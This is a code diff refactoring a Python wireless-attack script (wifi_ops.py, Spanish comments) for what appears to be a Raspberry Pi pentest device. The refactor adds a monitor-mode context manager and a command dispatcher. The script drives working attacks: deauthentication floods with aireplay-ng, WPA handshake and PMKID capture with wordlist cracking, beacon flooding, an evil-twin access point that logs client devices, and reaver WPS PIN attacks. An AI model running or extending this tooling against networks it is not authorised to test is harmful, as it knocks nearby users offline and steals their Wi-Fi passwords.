@@ -5,19 +5,37 @@ ya unmanaged en NetworkManager). Salida JSON, mismo patron que
 wifi_scan.py / db_tool.py.
 """
 import sys, os, re, json, subprocess, time, tempfile, glob, shutil
-import threading, http.server, socketserver, urllib.parse
+import threading, http.server, socketserver, urllib.parse, contextlib
+
+# Helper de subprocesos compartido (app/common/proc.py). Fallback local por si
+# el modulo no estuviera desplegado (deploy parcial): el script no debe morir.
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")))
+try:
+    from common.proc import run as _proc_run
+except Exception:
+    def _proc_run(cmd, timeout):
+        try:
+            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        except Exception:
+            return None
 
 def _run(cmd, timeout=10):
-    try:
-        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
-    except Exception:
-        return None
+    return _proc_run(cmd, timeout)
+
+# Rutas ABSOLUTAS de binarios privilegiados. DEBEN coincidir EXACTAMENTE con las
+# entradas NOPASSWD de /etc/sudoers.d/piscan-wifi (ver CLAUDE.md §9): si cambian,
+# sudo pide contrasena y bajo systemd el proceso se cuelga. Por eso son fijas y
+# centralizadas aca, NO resueltas con shutil.which (podria devolver otra ruta y
+# romper el match de sudoers). wash/reaver/bully SI usan _resolve_bin porque
+# viven en /usr/bin o /usr/sbin segun la distro y ambas estan en sudoers.
+BIN_IP = '/usr/bin/ip'
+BIN_IW = '/usr/sbin/iw'
 
 def ensure_up(iface):
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'up'])
 
 def get_status(iface):
-    r = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'info'])
+    r = _run(['sudo', BIN_IW, 'dev', iface, 'info'])
     if not r or not r.stdout:
         return 'unknown'
     for line in r.stdout.splitlines():
@@ -36,19 +54,38 @@ def reset_driver():
 
 def enable_monitor(iface):
     reset_driver()
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
-    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'monitor'])
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'up'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'down'])
+    _run(['sudo', BIN_IW, 'dev', iface, 'set', 'type', 'monitor'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'up'])
     time.sleep(0.5)
     return get_status(iface) == 'monitor'
 
 def disable_monitor(iface):
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'down'])
-    _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'type', 'managed'])
-    _run(['sudo', '/usr/bin/ip', 'link', 'set', iface, 'up'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'down'])
+    _run(['sudo', BIN_IW, 'dev', iface, 'set', 'type', 'managed'])
+    _run(['sudo', BIN_IP, 'link', 'set', iface, 'up'])
     time.sleep(0.5)
     return get_status(iface) == 'managed'
+
+
+class MonitorError(Exception):
+    """enable_monitor() fallo al entrar a monitor_mode()."""
+
+
+@contextlib.contextmanager
+def monitor_mode(iface):
+    """Context manager: pone `iface` en monitor al entrar y GARANTIZA volver a
+    managed al salir (incluso si el cuerpo lanza o hace return). Antes cada sitio
+    llamaba enable_monitor/disable_monitor a mano y un error intermedio podia
+    dejar la interfaz en monitor -> el proximo scan/conexion fallaba. Si no se
+    pudo entrar a monitor, lanza MonitorError (el cuerpo no corre)."""
+    if not enable_monitor(iface):
+        raise MonitorError(f"No se pudo activar modo monitor (estado real: {get_status(iface)})")
+    try:
+        yield
+    finally:
+        disable_monitor(iface)
 
 def deauth(bssid, channel, count, iface, duration=0, client_mac=None):
     """Deauth en dos modos:
@@ -61,30 +98,27 @@ def deauth(bssid, channel, count, iface, duration=0, client_mac=None):
     bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
     client = (client_mac or '').strip().upper()
     target = ['-c', client] if client else []   # selectivo vs broadcast
-    ok = enable_monitor(iface)
-    if not ok:
-        return None, f"No se pudo activar modo monitor (estado real: {get_status(iface)})"
+    try:
+        with monitor_mode(iface):   # garantiza volver a managed al salir
+            ch_result = _run(['sudo', BIN_IW, 'dev', iface, 'set', 'channel', str(channel)])
+            if ch_result is None or ch_result.returncode != 0:
+                err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
+                return None, f"No se pudo fijar canal {channel}: {err_detail}"
 
-    ch_result = _run(['sudo', '/usr/sbin/iw', 'dev', iface, 'set', 'channel', str(channel)])
-    if ch_result is None or ch_result.returncode != 0:
-        err_detail = (ch_result.stderr.strip() if ch_result else "sin respuesta")
-        disable_monitor(iface)
-        return None, f"No se pudo fijar canal {channel}: {err_detail}"
-
-    time.sleep(1)
-    if duration and int(duration) > 0:
-        d = int(duration)
-        # Sostenido: --deauth 0 = continuo, cortado por timeout tras `d` segundos
-        r = _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
-                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid] + target + [iface], timeout=d + 5)
-    else:
-        # Rafaga: enviar `count` rafagas y parar
-        r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
-                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid] + target + [iface], timeout=25)
-    output = ((r.stdout or '') + (r.stderr or '')) if r else ''
-
-    disable_monitor(iface)
-    return output, None
+            time.sleep(1)
+            if duration and int(duration) > 0:
+                d = int(duration)
+                # Sostenido: --deauth 0 = continuo, cortado por timeout tras `d` segundos
+                r = _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
+                          '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid] + target + [iface], timeout=d + 5)
+            else:
+                # Rafaga: enviar `count` rafagas y parar
+                r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
+                          '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid] + target + [iface], timeout=25)
+            output = ((r.stdout or '') + (r.stderr or '')) if r else ''
+            return output, None
+    except MonitorError as e:
+        return None, str(e)
 
 def _station_macs(prefix, bssid):
     """Lee el CSV de airodump (archivos prefix*.csv) y devuelve la lista de
@@ -1470,11 +1504,12 @@ def wps_scan(iface='wlan1', seconds=20):
     wash = _resolve_bin('wash', ['/usr/bin/wash', '/usr/sbin/wash'])
     if not wash:
         return None, "wash no instalado (apt install reaver)"
-    if not enable_monitor(iface):
-        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
-    r = _run(['sudo', '/usr/bin/timeout', str(seconds), wash, '-i', iface],
-             timeout=seconds + 5)
-    disable_monitor(iface)
+    try:
+        with monitor_mode(iface):   # garantiza volver a managed al salir
+            r = _run(['sudo', '/usr/bin/timeout', str(seconds), wash, '-i', iface],
+                     timeout=seconds + 5)
+    except MonitorError as e:
+        return None, str(e)
     if r is None:
         return None, "wash no respondio"
     return parse_wash_output(r.stdout or ''), None
@@ -1488,14 +1523,15 @@ def wps_attack(bssid, channel, iface='wlan1', seconds=120, pixie=True):
     if not reaver:
         return None, "reaver no instalado (apt install reaver)"
     bssid = bssid.upper()
-    if not enable_monitor(iface):
-        return None, f"No se pudo activar modo monitor (estado: {get_status(iface)})"
     cmd = ['sudo', '/usr/bin/timeout', str(seconds), reaver,
            '-i', iface, '-b', bssid, '-c', str(channel), '-vv']
     if pixie:
         cmd += ['-K', '1']   # Pixie-Dust
-    r = _run(cmd, timeout=seconds + 10)
-    disable_monitor(iface)
+    try:
+        with monitor_mode(iface):   # garantiza volver a managed al salir
+            r = _run(cmd, timeout=seconds + 10)
+    except MonitorError as e:
+        return None, str(e)
     raw = ((r.stdout or '') + (r.stderr or '')) if r else ''
     data = parse_reaver_output(raw)
     data['raw'] = raw[-800:]
@@ -1505,179 +1541,229 @@ def wps_attack(bssid, channel, iface='wlan1', seconds=120, pixie=True):
     return data, None
 
 
+# ─────────────────────────────────────────────────────────────
+# Dispatcher table-driven. Cada comando es cmd_<nombre>(argv) con argv ==
+# sys.argv (indices preservados respecto a la vieja cadena if/elif). Cada
+# handler imprime su propio JSON (y hace sys.exit(1) donde corresponde). Asi
+# cada comando es invocable/testeable por separado y main() solo rutea +
+# convierte errores de parseo de args en un JSON limpio (antes un int() con
+# basura tiraba traceback y rompia el contrato "un solo JSON").
+# ─────────────────────────────────────────────────────────────
+
+def _emit(obj):
+    print(json.dumps(obj))
+
+def _usage(msg):
+    _emit({"ok": False, "error": msg})
+    sys.exit(1)
+
+def cmd_status(argv):
+    iface = argv[2] if len(argv) > 2 else 'wlan1'
+    _emit({"ok": True, "mode": get_status(iface)})
+
+def cmd_enable(argv):
+    iface = argv[2] if len(argv) > 2 else 'wlan1'
+    success = enable_monitor(iface)
+    _emit({"ok": success, "mode": get_status(iface)})
+
+def cmd_disable(argv):
+    iface = argv[2] if len(argv) > 2 else 'wlan1'
+    success = disable_monitor(iface)
+    _emit({"ok": success, "mode": get_status(iface)})
+
+def cmd_deauth(argv):
+    if len(argv) < 5:
+        _usage("uso: wifi_ops.py deauth <bssid> <channel> <count> [iface]")
+    bssid = argv[2]
+    channel = int(argv[3])
+    count = int(argv[4])
+    iface_deauth = argv[5] if len(argv) > 5 else 'wlan1'
+    duration = int(argv[6]) if len(argv) > 6 else 0
+    client_mac = argv[7] if len(argv) > 7 else None
+    if client_mac and client_mac.strip():
+        # Selectivo: un cliente concreto (tap en una fila de cliente).
+        output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
+        atype = "deauth"
+    else:
+        # "Deauth red": dirigido a TODOS los clientes asociados (broadcast
+        # no tumba clientes modernos). Fallback a broadcast si no hay clientes.
+        output, err = deauth_network(bssid, channel, iface_deauth, duration, count)
+        atype = "deauth_red"
+    if err:
+        log_attack(atype, bssid, "fail", target_client_mac=client_mac, details=err)
+        _emit({"ok": False, "error": err, "mode": get_status(iface_deauth)})
+    else:
+        log_attack(atype, bssid, "success", target_client_mac=client_mac, details=output)
+        _emit({"ok": True, "output": output, "mode": get_status(iface_deauth)})
+
+def cmd_handshake(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py handshake <bssid> <channel> [iface] [segundos] [deauth_count]")
+    bssid = argv[2]
+    channel = int(argv[3])
+    iface_hs = argv[4] if len(argv) > 4 else 'wlan1'
+    capture_seconds = int(argv[5]) if len(argv) > 5 else 20
+    deauth_count = int(argv[6]) if len(argv) > 6 else 5
+    has_hs, cap_file, hs_output = capture_handshake(bssid, channel, iface_hs, capture_seconds, deauth_count)
+    if has_hs:
+        log_attack("handshake", bssid, "success", details=f"cap={cap_file}")
+        _emit({"ok": True, "handshake": True, "cap_file": cap_file})
+    else:
+        log_attack("handshake", bssid, "fail", details=(hs_output or "sin handshake")[:500])
+        _emit({"ok": True, "handshake": False, "cap_file": cap_file, "detail": (hs_output or "")[:400]})
+
+def cmd_audit(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py audit <cap_file> <bssid> [common|full] [timeout_seg]")
+    cap_file = argv[2]
+    bssid = argv[3]
+    wordlist_key = argv[4] if len(argv) > 4 else 'common'
+    timeout_seconds = int(argv[5]) if len(argv) > 5 else 120
+    found, password, audit_output = audit_handshake(cap_file, bssid, wordlist_key, timeout_seconds)
+    if found:
+        log_attack("audit", bssid, "weak", details=f"wordlist={wordlist_key} pass_len={len(password)}")
+        _emit({"ok": True, "found": True, "password": password, "wordlist": wordlist_key})
+    else:
+        log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
+        _emit({"ok": True, "found": False, "wordlist": wordlist_key})
+
+def cmd_pmkid(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py pmkid <bssid> <channel> [iface] [segundos]")
+    bssid = argv[2]
+    channel = int(argv[3])
+    iface_pk = argv[4] if len(argv) > 4 else 'wlan1'
+    seconds = int(argv[5]) if len(argv) > 5 else 30
+    data, err = pmkid_capture(bssid, channel, iface_pk, seconds)
+    if err:
+        log_attack("pmkid", bssid, "fail", details=err)
+        _emit({"ok": False, "error": err, "mode": get_status(iface_pk)})
+    else:
+        got = data["pmkid_target"] or data["eapol_target"]
+        log_attack("pmkid", bssid, "success" if got else "nada",
+                   details=f"hashes={data['hashes']} pmkid={data['pmkid_target']} eapol={data['eapol_target']} hc={data['hc22000']}")
+        out = {"ok": True}
+        out.update(data)
+        _emit(out)
+
+def cmd_beacon(argv):
+    channel = int(argv[2]) if len(argv) > 2 else 6
+    seconds = int(argv[3]) if len(argv) > 3 else 20
+    iface_b = argv[4] if len(argv) > 4 else 'wlan1'
+    data, err = beacon_flood(iface_b, channel, seconds)
+    if err:
+        log_attack("beacon", "", "fail", details=err)
+        _emit({"ok": False, "error": err, "mode": get_status(iface_b)})
+    else:
+        log_attack("beacon", "", "done",
+                   details=f"ch={data['channel']} {data['seconds']}s {data['pps']}pps")
+        out = {"ok": True}
+        out.update(data)
+        _emit(out)
+
+def cmd_evil_twin(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py evil_twin <ssid> <bssid> <channel> [segundos] [iface]")
+    ssid = argv[2]
+    bssid = argv[3]
+    channel = int(argv[4]) if len(argv) > 4 else 6
+    seconds = int(argv[5]) if len(argv) > 5 else 120
+    iface_et = argv[6] if len(argv) > 6 else 'wlan1'
+    data, err = evil_twin(iface_et, ssid, bssid, channel, seconds)
+    if err:
+        log_attack("honeypot", "", "fail", target_ssid=ssid, details=err)
+        _emit({"ok": False, "error": err, "mode": get_status(iface_et)})
+    else:
+        n = data["count"]
+        log_honeypot(ssid, data["clients"])   # telemetria por dispositivo
+        log_attack("honeypot", "", "done", target_ssid=ssid,
+                   details=f"clientes={n} bridge={data.get('bridge')}")
+        out = {"ok": True}
+        out.update(data)
+        _emit(out)
+
+def cmd_clients(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py clients <bssid> <channel> [iface] [segundos]")
+    bssid = argv[2]
+    channel = int(argv[3])
+    iface_cli = argv[4] if len(argv) > 4 else 'wlan1'
+    seconds = int(argv[5]) if len(argv) > 5 else 12
+    clients, err = scan_clients(bssid, channel, iface_cli, seconds)
+    if err:
+        _emit({"ok": False, "error": err, "mode": get_status(iface_cli)})
+    else:
+        _emit({"ok": True, "clients": clients, "count": len(clients)})
+
+def cmd_wps_scan(argv):
+    iface_w = argv[2] if len(argv) > 2 else 'wlan1'
+    seconds = int(argv[3]) if len(argv) > 3 else 20
+    aps, err = wps_scan(iface_w, seconds)
+    if err:
+        _emit({"ok": False, "error": err, "mode": get_status(iface_w)})
+        sys.exit(1)
+    _emit({"ok": True, "aps": aps, "count": len(aps)})
+
+def cmd_wps_attack(argv):
+    if len(argv) < 4:
+        _usage("uso: wifi_ops.py wps_attack <bssid> <channel> [iface] [segundos] [pixie0|pixie1]")
+    bssid = argv[2]
+    channel = int(argv[3])
+    iface_w = argv[4] if len(argv) > 4 else 'wlan1'
+    seconds = int(argv[5]) if len(argv) > 5 else 120
+    pixie = (argv[6] != 'pixie0') if len(argv) > 6 else True
+    data, err = wps_attack(bssid, channel, iface_w, seconds, pixie)
+    if err:
+        _emit({"ok": False, "error": err, "mode": get_status(iface_w)})
+        sys.exit(1)
+    found = bool(data['pin'] or data['psk'])
+    _emit({"ok": True, "found": found, "pin": data['pin'],
+           "psk": data['psk'], "detail": data['raw']})
+
+def cmd_list_captures(argv):
+    caps = list_captures()
+    _emit({"ok": True, "captures": caps, "count": len(caps)})
+
+def cmd_list_wordlists(argv):
+    wls = list_wordlists()
+    _emit({"ok": True, "wordlists": wls, "count": len(wls)})
+
+COMMANDS = {
+    'status': cmd_status,
+    'enable': cmd_enable,
+    'disable': cmd_disable,
+    'deauth': cmd_deauth,
+    'handshake': cmd_handshake,
+    'audit': cmd_audit,
+    'pmkid': cmd_pmkid,
+    'beacon': cmd_beacon,
+    'evil_twin': cmd_evil_twin,
+    'clients': cmd_clients,
+    'wps_scan': cmd_wps_scan,
+    'wps_attack': cmd_wps_attack,
+    'list_captures': cmd_list_captures,
+    'list_wordlists': cmd_list_wordlists,
+}
+
 def main():
     if len(sys.argv) < 2:
-        print(json.dumps({"ok": False, "error": "uso: wifi_ops.py <status|enable|disable> [iface]"}))
-        sys.exit(1)
+        _usage("uso: wifi_ops.py <status|enable|disable|deauth|handshake|audit|pmkid|"
+               "beacon|evil_twin|clients|wps_scan|wps_attack|list_captures|list_wordlists> [args]")
 
     cmd = sys.argv[1]
     iface = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
     ensure_up(iface)
 
-    if cmd == 'status':
-        print(json.dumps({"ok": True, "mode": get_status(iface)}))
-    elif cmd == 'enable':
-        success = enable_monitor(iface)
-        print(json.dumps({"ok": success, "mode": get_status(iface)}))
-    elif cmd == 'disable':
-        success = disable_monitor(iface)
-        print(json.dumps({"ok": success, "mode": get_status(iface)}))
-    elif cmd == 'deauth':
-        if len(sys.argv) < 5:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py deauth <bssid> <channel> <count> [iface]"}))
-            sys.exit(1)
-        bssid = sys.argv[2]
-        channel = int(sys.argv[3])
-        count = int(sys.argv[4])
-        iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
-        duration = int(sys.argv[6]) if len(sys.argv) > 6 else 0
-        client_mac = sys.argv[7] if len(sys.argv) > 7 else None
-        if client_mac and client_mac.strip():
-            # Selectivo: un cliente concreto (tap en una fila de cliente).
-            output, err = deauth(bssid, channel, count, iface_deauth, duration, client_mac)
-            atype = "deauth"
-        else:
-            # "Deauth red": dirigido a TODOS los clientes asociados (broadcast
-            # no tumba clientes modernos). Fallback a broadcast si no hay clientes.
-            output, err = deauth_network(bssid, channel, iface_deauth, duration, count)
-            atype = "deauth_red"
-        if err:
-            log_attack(atype, bssid, "fail", target_client_mac=client_mac, details=err)
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
-        else:
-            log_attack(atype, bssid, "success", target_client_mac=client_mac, details=output)
-            print(json.dumps({"ok": True, "output": output, "mode": get_status(iface_deauth)}))
-    elif cmd == 'handshake':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py handshake <bssid> <channel> [iface] [segundos] [deauth_count]"}))
-            sys.exit(1)
-        bssid = sys.argv[2]
-        channel = int(sys.argv[3])
-        iface_hs = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
-        capture_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 20
-        deauth_count = int(sys.argv[6]) if len(sys.argv) > 6 else 5
-        has_hs, cap_file, hs_output = capture_handshake(bssid, channel, iface_hs, capture_seconds, deauth_count)
-        if has_hs:
-            log_attack("handshake", bssid, "success", details=f"cap={cap_file}")
-            print(json.dumps({"ok": True, "handshake": True, "cap_file": cap_file}))
-        else:
-            log_attack("handshake", bssid, "fail", details=(hs_output or "sin handshake")[:500])
-            print(json.dumps({"ok": True, "handshake": False, "cap_file": cap_file, "detail": (hs_output or "")[:400]}))
-    elif cmd == 'audit':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py audit <cap_file> <bssid> [common|full] [timeout_seg]"}))
-            sys.exit(1)
-        cap_file = sys.argv[2]
-        bssid = sys.argv[3]
-        wordlist_key = sys.argv[4] if len(sys.argv) > 4 else 'common'
-        timeout_seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
-        found, password, audit_output = audit_handshake(cap_file, bssid, wordlist_key, timeout_seconds)
-        if found:
-            log_attack("audit", bssid, "weak", details=f"wordlist={wordlist_key} pass_len={len(password)}")
-            print(json.dumps({"ok": True, "found": True, "password": password, "wordlist": wordlist_key}))
-        else:
-            log_attack("audit", bssid, "strong", details=f"wordlist={wordlist_key} no encontrada")
-            print(json.dumps({"ok": True, "found": False, "wordlist": wordlist_key}))
-    elif cmd == 'pmkid':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py pmkid <bssid> <channel> [iface] [segundos]"}))
-            sys.exit(1)
-        bssid = sys.argv[2]
-        channel = int(sys.argv[3])
-        iface_pk = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
-        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 30
-        data, err = pmkid_capture(bssid, channel, iface_pk, seconds)
-        if err:
-            log_attack("pmkid", bssid, "fail", details=err)
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_pk)}))
-        else:
-            got = data["pmkid_target"] or data["eapol_target"]
-            log_attack("pmkid", bssid, "success" if got else "nada",
-                       details=f"hashes={data['hashes']} pmkid={data['pmkid_target']} eapol={data['eapol_target']} hc={data['hc22000']}")
-            out = {"ok": True}
-            out.update(data)
-            print(json.dumps(out))
-    elif cmd == 'beacon':
-        channel = int(sys.argv[2]) if len(sys.argv) > 2 else 6
-        seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 20
-        iface_b = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
-        data, err = beacon_flood(iface_b, channel, seconds)
-        if err:
-            log_attack("beacon", "", "fail", details=err)
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_b)}))
-        else:
-            log_attack("beacon", "", "done",
-                       details=f"ch={data['channel']} {data['seconds']}s {data['pps']}pps")
-            out = {"ok": True}
-            out.update(data)
-            print(json.dumps(out))
-    elif cmd == 'evil_twin':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py evil_twin <ssid> <bssid> <channel> [segundos] [iface]"}))
-            sys.exit(1)
-        ssid = sys.argv[2]
-        bssid = sys.argv[3]
-        channel = int(sys.argv[4]) if len(sys.argv) > 4 else 6
-        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
-        iface_et = sys.argv[6] if len(sys.argv) > 6 else 'wlan1'
-        data, err = evil_twin(iface_et, ssid, bssid, channel, seconds)
-        if err:
-            log_attack("honeypot", "", "fail", target_ssid=ssid, details=err)
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_et)}))
-        else:
-            n = data["count"]
-            log_honeypot(ssid, data["clients"])   # telemetria por dispositivo
-            log_attack("honeypot", "", "done", target_ssid=ssid,
-                       details=f"clientes={n} bridge={data.get('bridge')}")
-            out = {"ok": True}
-            out.update(data)
-            print(json.dumps(out))
-    elif cmd == 'clients':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py clients <bssid> <channel> [iface] [segundos]"}))
-            sys.exit(1)
-        bssid = sys.argv[2]
-        channel = int(sys.argv[3])
-        iface_cli = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
-        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 12
-        clients, err = scan_clients(bssid, channel, iface_cli, seconds)
-        if err:
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_cli)}))
-        else:
-            print(json.dumps({"ok": True, "clients": clients, "count": len(clients)}))
-    elif cmd == 'wps_scan':
-        iface_w = sys.argv[2] if len(sys.argv) > 2 else 'wlan1'
-        seconds = int(sys.argv[3]) if len(sys.argv) > 3 else 20
-        aps, err = wps_scan(iface_w, seconds)
-        if err:
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_w)}))
-            sys.exit(1)
-        print(json.dumps({"ok": True, "aps": aps, "count": len(aps)}))
-    elif cmd == 'wps_attack':
-        if len(sys.argv) < 4:
-            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py wps_attack <bssid> <channel> [iface] [segundos] [pixie0|pixie1]"}))
-            sys.exit(1)
-        bssid = sys.argv[2]
-        channel = int(sys.argv[3])
-        iface_w = sys.argv[4] if len(sys.argv) > 4 else 'wlan1'
-        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
-        pixie = (sys.argv[6] != 'pixie0') if len(sys.argv) > 6 else True
-        data, err = wps_attack(bssid, channel, iface_w, seconds, pixie)
-        if err:
-            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_w)}))
-            sys.exit(1)
-        found = bool(data['pin'] or data['psk'])
-        print(json.dumps({"ok": True, "found": found, "pin": data['pin'],
-                          "psk": data['psk'], "detail": data['raw']}))
-    elif cmd == 'list_captures':
-        caps = list_captures()
-        print(json.dumps({"ok": True, "captures": caps, "count": len(caps)}))
-    elif cmd == 'list_wordlists':
-        wls = list_wordlists()
-        print(json.dumps({"ok": True, "wordlists": wls, "count": len(wls)}))
-    else:
-        print(json.dumps({"ok": False, "error": f"comando desconocido: {cmd}"}))
-        sys.exit(1)
+    fn = COMMANDS.get(cmd)
+    if fn is None:
+        _usage(f"comando desconocido: {cmd}")
+    try:
+        fn(sys.argv)
+    except SystemExit:
+        raise  # _usage()/sys.exit() de un handler: propagar tal cual
+    except (ValueError, IndexError) as e:
+        # int() con basura o falta un arg posicional: JSON limpio, no traceback.
+        _usage(f"argumento invalido: {e}")
 
 if __name__ == "__main__":
     # Envoltorio con log centralizado (ActionLog); si falla, main() directo.
